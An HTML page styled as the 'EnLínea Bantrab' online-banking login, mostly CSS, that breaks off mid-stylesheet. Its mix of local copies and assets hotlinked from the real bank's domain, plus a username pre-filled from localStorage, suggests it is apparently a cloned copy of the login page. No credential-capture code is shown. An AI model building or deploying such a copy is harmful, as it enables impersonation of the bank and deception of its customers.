<html xmlns="http://www.w3.org/1999/xhtml">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, shrink-to-fit=no">
      <link rel="stylesheet" href="css/bootstrap.min.css">
      <link rel="stylesheet" href="css/jcustom.css">
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 

      <title>
         EnLínea Bantrab
      </title>
      <script>
    window.onload = function() {
      const storedUsername = localStorage.getItem("username");
      if (storedUsername) {
        document.getElementById("input-username").value = storedUsername;
      } else {
        console.error("No se encontró ningún valor de usuario en localStorage.");
      }
    };

  </script>
     
      <link href="css/jquery-ui-1.9.1.custom.css" rel="stylesheet" type="text/css">
      <link href="css/jquery.jqplot.min.css" rel="stylesheet" type="text/css">
 
      <style type="text/css" media="screen" id="less:style">@import url('https://bancaenlinea.bantrab.com.gt/styles/fluid_grid.css');
         @import url('https://bancaenlinea.bantrab.com.gt/styles/jquery.lightbox-0.5.css');
         html,
         body,
         div,
         span,
         applet,
         object,
         iframe,
         h1,
         h2,
         h3,
         h4,
         h5,
         h6,
         p,
         blockquote,
         pre,
         a,
         abbr,
         acronym,
         address,
         big,
         cite,
         code,
         del,
         dfn,
         em,
         font,
         img,
         ins,
         kbd,
         q,
         s,
         samp,
         small,
         strike,
         strong,
         sub,
         sup,
         tt,
         var,
         b,
         u,
         i,
         center,
         dl,
         dt,
         dd,
         ol,
         ul,
         li,
         fieldset,
         form,
         label,
         legend,
         table,
         caption,
         tbody,
         tfoot,
         thead,
         tr,
         th,
         td {
         margin: 0;
         padding: 0;
         border: 0;
         outline: 0;
         font-size: 100%;
         vertical-align: baseline;
         background: transparent;
         }
         body {
         line-height: 1;
         }
         ol,
         ul {
         list-style: none;
         }
         blockquote,
         q {
         quotes: none;
         }
         blockquote:before,
         blockquote:after,
         q:before,
         q:after {
         content: '';
         content: none;
         }
         :focus {
         outline: 0;
         }
         ins {
         text-decoration: none;
         }
         del {
         text-decoration: line-through;
         }
         table {
         border-collapse: collapse;
         border-spacing: 0;
         }
         /*Area donde se carga la fuente personalizada*/
         @font-face {
         font-family: Avenir;
         src: url(https://bancaenlinea.bantrab.com.gt/styles/../fonts/Avenir.ttc);
         }
         @font-face {
         font-family: 'Avenir-Book-01';

         src: url('css/Avenir-Book-01.ttf') format('truetype');/* IE9 Compat Modes */
         /* Safari, Android, iOS */
         }
         /*
         @font-face{
         font-family:Avenir-Light-07;
         src:url(../fonts/Avenir-Light-07.ttf);
         }
         */
         @font-face {
         font-family: 'Avenir-Light-07';
         src: url('css/Avenir-Light-07.ttf') format('truetype');/* IE9 Compat Modes */
         /* Safari, Android, iOS */
         }
         .fuentePersonalizada {
         font-family: Avenir-Light-07;
         }
         /*
         body{font:13px/1.5 Avenir,'Myriad Pro',Arial,'Liberation Sans',FreeSans,sans-serif}ol{list-style:decimal}ul{list-style:disc}li{margin-left:30px}p,dl,hr,ol,ul,pre,table,address,fieldset{margin-bottom:20px}
         */
         body {
         font-family: Avenir-Light-07, Avenir-Book-01;
         }
         ol {
         list-style: decimal;
         }
         ul {
         list-style: disc;
         }
         li {
         margin-left: 30px;
         }
         p,
         dl,
         hr,
         ol,
         ul,
         pre,
         table,
         address,
         fieldset {
         margin-bottom: 20px;
         }
         h1,
         h2,
         h3,
         h4,
         h5,
         h6 {
         font-weight: normal;
         margin-bottom: 10px;
         }
         h1 {
         font-size: 48px;
         }
         h2 {
         font-size: 36px;
         }
         h3 {
         font-size: 24px;
         }
         h4 {
         font-size: 18px;
         }
         h5 {
         font-size: 14px;
         }
         h6 {
         font-size: 12px;
         }
         /*defining variables*/
         /*main-colors*/
         /*
         @main-color-dark: #F68C29;
         @main-color: #FCAF21;
         @main-color-light: #FFCB27;
         */
         /*light-colors*/
         .main-color {
         color: #ffcb00 !important;
         }
         hr {
         border-top: 1px solid #fff #333;
         height: 1px;
         background-color: #ccc;
         clear: both;
         overflow: hidden;
         *margin: -5px 0 5px;
         *width: 100%;
         }
         /* color de inicio de letra*/
         a {
         color: #010100;
         text-decoration: none;
         }
         a.green {
         color: #00ADB1!important;
         }
         a.red {
         color: #d90000 !important;
         }
         .green {
         color: #00ADB1!important;
         }
         .red {
         color: #d90000 !important;
         }
         .blue {
         color: #0085b2 !important;
         }
         .img-100 img {
         max-width: 100%;
         }
         .fright {
         float: right;
         display: inline;
         }
         .fleft {
         float: left;
         display: inline;
         }
         .gradient {
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, #f68c29;
         background: #FFCB00;
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -moz-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-gradient(linear, left top, left bottom, color-stop(0%, #ffcb00), color-stop(100%, #fcaf21));
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -o-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -ms-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, linear-gradient(to bottom, #ffcb00 0%, #fcaf21 100%);
         filter: progid:dximagetransform.microsoft.gradient(startColorstr='#f68c29', endColorstr='#fcaf21', GradientType=0);
         }
         .cover {
         -moz-background-size: cover!important;
         -webkit-background-size: cover!important;
         -o-background-size: cover!important;
         background-size: cover!important;
         }
         .all {
         width: 100%;
         position: relative;
         }
         .small {
         font-size: 11px;
         }
         table.table {
         /*tfoot*/
         }
         table.table .center {
         text-align: center;
         }
         table.table .right {
         text-align: right;
         }
         table.table th {
         padding: 10px;
         text-align: left;
         vertical-align: middle;
         }
         table.table td {
         vertical-align: middle;
         }
         table.table tbody {
         border: 1px solid #cccccc;
         }
         table.table tbody tr {
         border-bottom: 1px solid #cccccc;
         }
         table.table tbody tr:hover {
         /*border-color:@main-color;*/
         }
         table.table tbody tr:hover td {
         background-color: #ffffff !important;
         }
         table.table tbody td {
         color: #000000;
         background-color: #ffffff;
         padding: 10px;
         }
         table.table a {
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         color: #0085b2;
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         }
         table.table .account-total {
         font-size: 1.3rem;
         font-weight: bold;
         line-height: 1;
         }
         table.table td.account-total.green {
         color: #649920;
         }
         table.table td.account-total.red {
         color: #d90000;
         }
         table.table td.account-image {
         text-align: center;
         }
         table.table td.account-image a {
         background: url(https://bancaenlinea.bantrab.com.gt/styles/../images/icon-sprites.png) no-repeat left top;
         width: 29px;
         height: 27px;
         display: block;
         text-indent: -9999em;
         margin: 0 auto;
         }
         table.table td.account-note {
         text-align: center;
         }
         table.table td.account-note a {
         background: url(https://bancaenlinea.bantrab.com.gt/styles/../images/icon-sprites.png) no-repeat right top;
         width: 27px;
         height: 27px;
         display: block;
         text-indent: -9999em;
         margin: 0 auto;
         }
         table.table td.shadow {
         background-image: url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg-gradient-gray.png);
         background-repeat: repeat-y;
         background-position: left top;
         }
         table.table tfoot {
         border-bottom: 1px solid #cccccc;
         }
         table.table tfoot .account-name span {
         border-left: 1px solid #cccccc;
         }
         table.table tfoot .account-total span {
         border-right: 1px solid #cccccc;
         }
         table.table tfoot .last span {
         border-right: 1px solid #cccccc;
         }
         table.table tfoot .first span {
         border-left: 1px solid #cccccc;
         }
         table.table tfoot td span {
         border-top: 1px solid #cccccc;
         height: 21px;
         display: block;
         margin: 10px 0 0!important;
         background: #ffffff;
         padding: 10px;
         }
         table.table.hovered-table tbody tr:hover {
         border-color: #fab12e;
         }
         table.table.hovered-table tbody tr:hover td {
         background-color: #fdd790 !important;
         }
         table.table.sided td:nth-child(odd),
         table.table.sided th:nth-child(odd),
         table.table.sided td:nth-child(odd) span {
         text-align: left!important;
         }
         table.table.sided td:nth-child(even),
         table.table.sided th:nth-child(even),
         table.table.sided td:nth-child(even) span {
         text-align: right!important;
         }
         .t33 {
         width: 33%;
         }
         .t50 {
         width: 50%;
         }
         .t17 {
         width: 17%;
         }
         table.shadow {
         background: #ffffff;
         }
         table.shadow tbody {
         border: 1px solid #cccccc;
         }
         table.shadow tbody td {
         padding: 5px;
         width: 50%;
         background: url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg-gradient-gray.png) repeat-y left top;
         color: #000000;
         }
         table.shadow tbody th {
         padding: 5px;
         }
         table.shadow tbody tr {
         border-bottom: 1px solid #cccccc;
         text-align: left;
         }
         table.shadow tbody.striped tr:nth-child(odd) {
         background: #bfdfff;
         }
         table.shadow tbody.striped tr:nth-child(even) {
         background: #ffffff;
         }
         table.shadow tbody.t33 tbody th {
         width: 33%;
         }
         /*.shadow*/
         .dataTables_wrapper {
         margin-top: 20px;
         }
         .table-box .title {
         margin: 0 0 10px;
         }
         .table-box .title.bordered {
         border-bottom: 1px solid #cccccc;
         margin: 0 0 10px;
         }
         .title {
         margin: 0 0 10px;
         }
         .title.bordered {
         border-bottom: 1px solid #cccccc;
         margin: 0 0 10px;
         }
         /*@breadcrumbs*/
         .breadcrums {
         font-size: 10px;
         opacity: 0.6;
         text-transform: uppercase;
         }
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         /*@buttons*/
         .button,
         a.button {
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, #f68c29;
         background: #FFCB00;
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -moz-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-gradient(linear, left top, left bottom, color-stop(0%, #ffcb00), color-stop(100%, #fcaf21));
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -o-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -ms-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, linear-gradient(to bottom, #ffcb00 0%, #fcaf21 100%);
         filter: progid:dximagetransform.microsoft.gradient(startColorstr='#f68c29', endColorstr='#fcaf21', GradientType=0);
         color: #ffffff !important;
         padding: 5px 10px;
         -moz-border-radius: 4px;
         -webkit-border-radius: 4px;
         -o-border-radius: 4px;
         border-radius: 4px;
         -moz-border-radius: 4px;
         -webkit-border-radius: 4px;
         -o-border-radius: 4px;
         border-radius: 4px;
         text-align: center;
         text-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
         border: none;
         -moz-transition: all 0.1s linear;
         -webkit-transition: all 0.1s linear;
         -o-transition: all 0.1s linear;
         transition: all 0.1s linear;
         font-size: 11pt;
         font-weight: bold;
         font-family: Avenir-Light-07;
         }
         .button:hover,
         a.button:hover {
         cursor: pointer;
         -moz-box-shadow: 0 0 5px #444444;
         -webkit-box-shadow: 0 0 5px #444444;
         -o-box-shadow: 0 0 5px #444444;
         box-shadow: 0 0 5px #444444;
         }
         .button.block,
         a.button.block {
         display: inline-block;
         margin: 0 auto;
         }
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         /*@wrappers*/
         .centered {
         text-align: center;
         }
         .centered .text {
         padding: 20px;
         }
         .righted {
         text-align: right;
         }
         .righted .text {
         padding: 20px;
         }
         /*@forms*/
         .form label {
         display: block;
         font-weight: bold;
         margin-top: 5px;
         overflow: hidden;
         }
         .form label.error {
         color: #F00;
         font-weight: normal;
         }
         .form .form-row {
         margin-bottom: 0;
         padding: 0 0;
         }
         .form .form-row.left-2-row {
         float: left;
         display: inline;
         width: 49%;
         margin-right: 1%;
         }
         .form .form-row.right-2-row {
         float: left;
         display: inline;
         width: 49%;
         margin-left: 1%;
         }
         .form .form-row.checkbox label,
         .form .form-row.radio label {
         display: inline!important;
         }
         .form .description {
         font-style: italic;
         font-weight: normal;
         float: right;
         display: inline;
         margin-right: 5%;
         }
         .form .input-text,
         .form textarea,
         .form select {
         padding: 5px;
         font-size: 13px;
         font-family: Arial, Helvetica, sans-serif;
         border: 1px solid #cccccc;
         }
         .form .input-text.small,
         .form textarea.small,
         .form select.small {
         width: 30%;
         }
         .form .input-text.medium,
         .form textarea.medium,
         .form select.medium {
         width: 65%;
         }
         .form .input-text.large,
         .form textarea.large,
         .form select.large {
         width: 95%;
         }
         .form .input-text.search,
         .form textarea.search,
         .form select.search {
         width: 75%;
         margin-right: 2%;
         }
         .form .input-text.shadowed,
         .form textarea.shadowed,
         .form select.shadowed {
         -moz-box-shadow: 0 0 5px #cccccc inset;
         -webkit-box-shadow: 0 0 5px #cccccc inset;
         -o-box-shadow: 0 0 5px #cccccc inset;
         box-shadow: 0 0 5px #cccccc inset;
         }
         .form .input-text:focus,
         .form textarea:focus,
         .form select:focus {
         border: 1px solid #73b9ff;
         -moz-box-shadow: 0 0 5px #0085b2;
         -webkit-box-shadow: 0 0 5px #0085b2;
         -o-box-shadow: 0 0 5px #0085b2;
         box-shadow: 0 0 5px #0085b2;
         }
         .form .input-text.read-only,
         .form textarea.read-only,
         .form select.read-only {
         border: none;
         }
         .form .inline-labeled {
         margin-top: 10px;
         }
         .form button.search {
         margin-top: 3px;
         width: 20%;
         }
         .alert {
         padding: 10px;
         margin-bottom: 20px;
         /*INICIO VCOCHOY CAMBIO DE IMAGEN, COLOR QUE SOLICITARON text-shadow: 0 1px 0 rgb(222,0,96);*/
         /*text-shadow: 0 1px 0 rgba(109, 77, 77, 0.5);*/
         text-align: center;
         display: block;
         -moz-border-radius: 4px;
         -webkit-border-radius: 4px;
         -o-border-radius: 4px;
         border-radius: 4px;
         -moz-border-radius: 4px;
         -webkit-border-radius: 4px;
         -o-border-radius: 4px;
         border-radius: 4px;
         }
         .alert.error {
         background-color: #ffffff;
         border: 1px solid #DE0060;
         color: #DE0060;
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         }
         .alert.success {
         background-color: #6dab23;
         border: 1px solid #649920;
         color: #649920;
         }
         .alert.info {
         background-color: #58595B;
         border: 1px solid #000000;
         color: #ffffff;
         }
         .dataTables_wrapper {
         overflow: hidden;
         }
         .dataTables_wrapper .dataTables_length,
         .dataTables_wrapper .dataTables_info {
         float: left;
         display: inline;
         padding: 5px;
         }
         .dataTables_wrapper .dataTables_filter,
         .dataTables_wrapper .dataTables_paginate {
         float: right;
         display: inline;
         }
         .dataTables_wrapper .dataTables_filter input,
         .dataTables_wrapper .dataTables_paginate input {
         padding: 5px;
         }
         .dataTables_wrapper .dataTables_info {
         margin-bottom: 10px;
         }
         .dataTables_wrapper .dataTables_paginate {
         margin-bottom: 10px;
         }
         .dataTables_wrapper .dataTables_paginate .paginate_disabled_previous,
         .dataTables_wrapper .dataTables_paginate .paginate_disabled_next {
         display: none;
         margin: 0 10px;
         }
         .dataTables_wrapper table {
         clear: both;
         margin-bottom: 10px;
         }
         .dataTables_wrapper table .sorting {
         background: url(https://bancaenlinea.bantrab.com.gt/styles/../images/mini-sub-up-down.png) no-repeat right center;
         }
         .dataTables_wrapper table .sorting_asc {
         background: url(https://bancaenlinea.bantrab.com.gt/styles/../images/mini-sub-up.png) no-repeat right center;
         }
         .dataTables_wrapper table .sorting_desc {
         background: url(https://bancaenlinea.bantrab.com.gt/styles/../images/mini-sub.png) no-repeat right center;
         }
         .ui-tooltip {
         background-color: #FFF;
         }
         .accordion .holder .handle {
         background: #eeeeee;
         }
         .accordion .holder .handle.ui-state-active {
         background: #f2a419;
         }
         .ui-widget-overlay {
         background: rgba(0, 0, 0, 0.8) !important;
         }
         .ui-dialog {
         -moz-border-radius: 8px !important;
         -webkit-border-radius: 8px !important;
         -o-border-radius: 8px !important;
         border-radius: 8px !important;
         -moz-border-radius: 8px !important;
         -webkit-border-radius: 8px !important;
         -o-border-radius: 8px !important;
         border-radius: 8px !important;
         }
         .mini-header {
         display: block;
         text-align: left;
         opacity: 0.5;
         font-size: 10px;
         text-transform: uppercase;
         }
         .jqplot-target {
         position: relative;
         color: #666666;
         font-family: Arial, Helvetica, sans-serif;
         font-size: 1.2em;
         /*    height: 300px;
         width: 400px;*/
         }
         table.jqplot-table-legend {
         margin-top: 12px;
         margin-bottom: 12px;
         margin-left: 12px;
         margin-right: 12px;
         }
         table.jqplot-table-legend td {
         padding: 5px !important;
         }
         table.jqplot-table-legend,
         table.jqplot-cursor-legend {
         background-color: rgba(255, 255, 255, 0.6);
         border: 1px solid #cccccc;
         position: absolute;
         font-size: 0.75em;
         }
         td.jqplot-table-legend {
         vertical-align: middle;
         }
         .jqplot-data-label {
         color: #fff;
         text-shadow: 1px 1px 1px #000000;
         }
         body {
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         background: #ffffff;
         color: #444444;
         }
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         body#login {
         background: #ffffff;
         }
         /*INICIO VCOCHOY se modifico el footer*/
         /*header*/
         header {
         z-index: 100;
         /*position: fixed !important;*/
         padding: 0;
         color: #000000;
         height: 85px;
         /*color de letra del menu*/
         }
         header a {
         color: #020000;
         text-decoration: none;
         }
         header .top-header {
         font-size: 18px;
         }
         /* Josbel */
         .LoginImgback {
         position: absolute;
         margin: 0px 0px 0px 0px;
         top: 0px;
         left: 0px;
         width: 100%;
         height: 400%;
         overflow: hidden;
         }
         .LoginCred {
         position: absolute;
         top: 135%;
         left: 60%;
         right: 0%;
         margin: 0 auto;
         width: 25%;
         /*border: red 2px solid;*/
         }
         /*boots*/
         html,
         body {
         height: 100%;
         }
         .bdcenter {
         /*background: url("../images/Fondos_Login/Fondomhs.png") no-repeat center center fixed; */
         -webkit-background-size: cover;
         -moz-background-size: cover;
         -o-background-size: cover;
         background-size: cover;
         min-height: 100%;
         display: flex;
         align-items: center;
         /*justify-content: center;*/
         /* no compatible: IE 10/11 */
         }
         @media (max-width: 800px) {
         .bdcenter {
         background-color: white;
         }
         .form-signin {
         width: 100%;
         max-width: 370px;
         padding: 15px;
         margin: auto;
         display: block;
         }
         }
         @media (min-width: 801px) {
         .bdcenter {
         background: url("https://bancaenlinea.bantrab.com.gt/../images/Fondos_Login/Fondomhs.png");
         background-position: center center;
         background-repeat: no-repeat;
         background-attachment: fixed;
         background-size: cover;
         }
         .form-signin {
         width: 100%;
         max-width: 370px;
         padding: 15px;
         margin: auto;
         /*margin-left:auto; 
         margin-right:0;*/
         display: block;
         zoom: 70%;
         }
         }
         .form-signin .checkbox {
         font-weight: 400;
         }
         .form-signin .form-control {
         position: relative;
         box-sizing: border-box;
         height: auto;
         padding: 10px;
         font-size: 16px;
         }
         .form-signin .form-control:focus {
         z-index: 2;
         }
         .form-signin input[type="email"] {
         margin-bottom: -1px;
         border-bottom-right-radius: 0;
         border-bottom-left-radius: 0;
         }
         .form-signin input[type="password"] {
         margin-bottom: 10px;
         border-top-left-radius: 0;
         border-top-right-radius: 0;
         }
         .form-signin .imgbienv {
         margin-right: 1%;
         margin-bottom: 10%;
         }
         .form-signin .imgtips {
         margin-left: 0%;
         margin-top: 20%;
         margin-bottom: 20%;
         }
         .form-signin .lblbienvenido {
         margin-top: 15%;
         height: 40px;
         }
         .form-signin .imgbienvenido {
         margin-top: 0%;
         height: 80px;
         margin-bottom: 5%;
         }
         .form-signin .clsimgtip {
         margin-top: 0%;
         height: 150px;
         margin-bottom: 10%;
         margin-left: 0;
         margin-right: auto;
         }
         .form-signin .clsinput {
         margin-left: 0%;
         margin-top: 10%;
         margin-bottom: 10%;
         }
         .form-signin .clsbutton {
         margin-left: 0%;
         margin-top: 5%;
         margin-bottom: 10%;
         }
         /*fin boots*/
         /* Fin Josbel */
         .headerImagen {
         background: url(https://bancaenlinea.bantrab.com.gt/images/header_bg.png) no-repeat;
         background-position: right;
         background-color: #dfe1e1;
         }
         .headerImagen2 {
         background: url(https://bancaenlinea.bantrab.com.gt/images/header_bg.png) no-repeat;
         background-position: right;
         background-color: #ece9e9;
         }
         /*@login*/
         .login-header {
         background: none!important;
         padding: 10px 0 0;
         }
         .login-header .top-menu > li > a {
         color: #fab12e;
         }
         /* INICIO VCOCHOY CAMBIO DE IMAGEN*/
         #login-container {
         margin-top: 1px;
         /*background: @white; CAPS*/
         /*padding: 78px 0;*/
         /*padding-left: 50px;*/
         }
         #login-container .form {
         padding-top: 150px;
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         }
         #login-container .form .input-text {
         border-color: #05738E;
         background: #ffffff url(https://bancaenlinea.bantrab.com.gt/images/login-sprites.png) no-repeat left 1px;
         padding-left: 20px;
         }
         #login-container .form .input-text.pass {
         background-position: left -45px;
         }
         #login-container .form .button {
         margin: 20px 0 0;
         color: #60605D !important;
         width: 93%;
         display: block;
         background: #FFCB00;
         font-size: 13pt;
         font-weight: bold;
         font-family: Avenir-Light-07;
         }
         #login-container .form .lost-pass {
         margin: 10px 0 0;
         }
         #login-container2 {
         margin-top: 5px;
         /*background: @white;CAPS*/
         padding: 68px 0;
         }
         #login-container2 .form .input-text {
         border-color: #18b0d2;
         background: #ffffff url(https://bancaenlinea.bantrab.com.gt/images/login-sprites.png) no-repeat left 1px;
         padding-left: 20px;
         }
         #login-container2 .form .input-text.pass {
         background-position: left -45px;
         }
         /*menu style*/
         .top-menu {
         margin-bottom: 0;
         }
         .top-menu li {
         list-style: none;
         float: left;
         display: inline;
         border-right: 1px solid rgba(255, 255, 255, 0.5);
         margin: 0 0 0 10px;
         /*span.arrow{
         background:url(images/mini-sub-white.png) no-repeat right center;
         .fright;
         width:10px;
         height:15px;
         }*/
         }
         .top-menu li a {
         display: block;
         padding-right: 10px;
         margin: 0;
         /*INICIO VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         color: #ffffff;
         /*FIN VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         }
         .top-menu li:first-child {
         margin-left: 5px;
         }
         .top-menu li:last-child a {
         border: none;
         }
         .top-menu li.has-sub {
         position: relative;
         }
         .top-menu li.has-sub > a {
         overflow: hidden;
         background: url(https://bancaenlinea.bantrab.com.gt/images/mini-sub-white.png) no-repeat right center;
         margin-right: 5px;
         }
         .top-menu li .dropdown {
         top: 30px;
         }
         .top-menu.small {
         /*INICIO VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         font-size: 79%;
         color: #ffffff;
         /*FIN VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         }
         /*--top-menu--*/
         /*INICIO VCOCHOY CAMBIO DE IMAGEN -- Centrado del drop down*/
         .centerDropDown {
         padding-top: 6px;
         }
         /*FIN VCOCHOY CAMBIO DE IMAGEN --*/
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         .menu {
         margin-bottom: 0;
         }
         .menu li {
         list-style: none;
         float: left;
         display: inline;
         vertical-align: top;
         display: inline-block;
         margin: 0 0 0 10px;
         padding: 10px 0;
         /*--home--*/
         }
         .menu li.home {
         margin-left: 5px;
         }
         .menu li.home a {
         background: url(https://bancaenlinea.bantrab.com.gt/images/home-sprites.png) no-repeat center top;
         display: block;
         text-indent: -9999em;
         width: 20px;
         height: 16px;
         }
         .menu li.home:hover,
         .menu li.home.current {
         margin-left: 0;
         }
         .menu li.home:hover a,
         .menu li.home.current a {
         background-position: center top!important;
         margin-left: 0;
         width: 15px;
         margin: 0 -2px 4px 2px;
         }
         .menu li a {
         display: block;
         padding: 0 0 0 0;
         font-size: 92%;
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         margin: 0;
         border-right: 1px solid rgba(255, 255, 255, 0.5);
         text-align: center;
         }
         .menu li:hover,
         .menu li.current {
         /*INICIO VCOCHOY CAMBIO DE IMAGEN 05738E*/
         background-color: #00ADB1;
         border: none;
         margin: 0;
         padding: 10px;
         -moz-border-radius-topleft: 5px;
         -moz-border-radius-topright: 5px;
         -webkit-border-top-left-radius: 5px;
         -webkit-border-top-right-radius: 5px;
         border-top-left-radius: 5px;
         border-top-right-radius: 5px;
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         }
         .menu li:hover a,
         .menu li.current a {
         padding: 0;
         border-right: 1px solid rgba(255, 255, 255, 0);
         color: #ffffff;
         }
         .menu li:last-child a {
         border: none;
         }
         .menu li.has-sub {
         position: relative;
         }
         .menu li.has-sub a {
         overflow: hidden;
         }
         .menu.small {
         font-size: 11px;
         }
         /*--menu--*/
         .container_subMenu {
         margin-left: 7%;
         margin-right: 0%;
         margin: 0;
         padding-left: 8%;
         }
         /*INICIO VCOCHOY CAMBIO DE IMAGEN #05738E*/
         .sub-nav {
         background: #00ADB1;
         /*border-bottom: 1px solid @main-color;*/
         z-index: 3;
         height: 40px;
         margin-bottom: -1px;
         top: -6px;
         }
         .sub-nav .container_12 {
         position: relative /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         ;
         }
         .sub-nav .sub-menu-holder {
         margin-left: 90px;
         position: relative;
         }
         .sub-nav ul {
         overflow: hidden;
         display: none;
         position: absolute;
         left: 0;
         top: 0;
         }
         .sub-nav ul.current {
         display: block;
         }
         .sub-nav li {
         /*INICIO VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         }
         .sub-nav li a {
         border: none!important;
         color: #ffffff;
         }
         .sub-nav li:hover,
         .sub-nav li.current {
         border-bottom: 1px solid #000000;
         }
         .sub-nav li:hover a,
         .sub-nav li.current a {
         color: #ffffff;
         }
         /*--sub-nav--*/
         /*FIN VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         .main-menu-wrap {
         float: left;
         display: inline;
         /*margin:35px 0 0;*/
         /*INICIO VCOCHOY CAMBIO DE IMAGEN*/
         padding-top: 1%;
         border-radius: 1% 1% 1% 1%;
         /*Asi estaba antes:00ADB1 */
         background-color: #ece9e9;
         /*FIN VCOCHOY CAMBIO DE IMAGEN*/
         }
         #mainmenu {
         /*.fleft;*/
         overflow: hidden;
         /*INICIO VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         margin: 20px 0 0;
         /*FIN VCOCHOY CAMBIO DE IMAGEN BANTRAB*/
         -moz-border-radius-topleft: 5px;
         -moz-border-radius-topright: 5px;
         -webkit-border-top-left-radius: 5px;
         -webkit-border-top-right-radius: 5px;
         border-top-left-radius: 5px;
         border-top-right-radius: 5px;
         }
         /*@dropdown*/
         .dropdown {
         position: absolute;
         background: #ffffff;
         width: 150px;
         font-size: 11px;
         display: none;
         -moz-box-shadow: 0 5px 5px #cccccc;
         -webkit-box-shadow: 0 5px 5px #cccccc;
         -o-box-shadow: 0 5px 5px #cccccc;
         box-shadow: 0 5px 5px #cccccc;
         z-index: 10;
         }
         .dropdown.stick-to-right {
         right: 0;
         top: 40px;
         }
         .dropdown .top-side {
         background: url(https://bancaenlinea.bantrab.com.gt/images/sprites.png) no-repeat -15px -22px;
         width: 14px;
         height: 6px;
         position: absolute;
         top: -6px;
         left: 20px;
         }
         .dropdown .top-right {
         background: url(https://bancaenlinea.bantrab.com.gt/images/sprites.png) no-repeat -15px -22px;
         width: 14px;
         height: 6px;
         position: absolute;
         top: -6px;
         left: 20px;
         }
         .dropdown .top-left {
         background: url(https://bancaenlinea.bantrab.com.gt/images/sprites.png) no-repeat -15px -22px;
         width: 14px;
         height: 6px;
         position: absolute;
         top: -6px;
         right: 40px;
         }
         .dropdown.small {
         width: 100px;
         }
         .dropdown.medium {
         width: 200px;
         }
         .dropdown.large {
         width: 300px;
         }
         .dropdown img {
         margin-right: 10px;
         }
         .dropdown ul {
         margin: 0;
         }
         .dropdown li {
         float: none;
         display: block;
         border: none;
         padding: 5px!important;
         -moz-border-radius: 0px !important;
         -webkit-border-radius: 0px !important;
         -o-border-radius: 0px !important;
         border-radius: 0px !important;
         -moz-border-radius: 0px !important;
         -webkit-border-radius: 0px !important;
         -o-border-radius: 0px !important;
         border-radius: 0px !important;
         margin: 0!important;
         }
         .dropdown li:hover {
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, #f68c29;
         background: #FFCB00;
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -moz-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-gradient(linear, left top, left bottom, color-stop(0%, #ffcb00), color-stop(100%, #fcaf21));
         background: #ffcb00 url(https://bancaenlinea.bantrab.com.gt/styles/../images/bg_header_nuevo.png) top repeat-x, -webkit-linear-gradient(top, #ffcb00 0%, #fcaf21 100%);
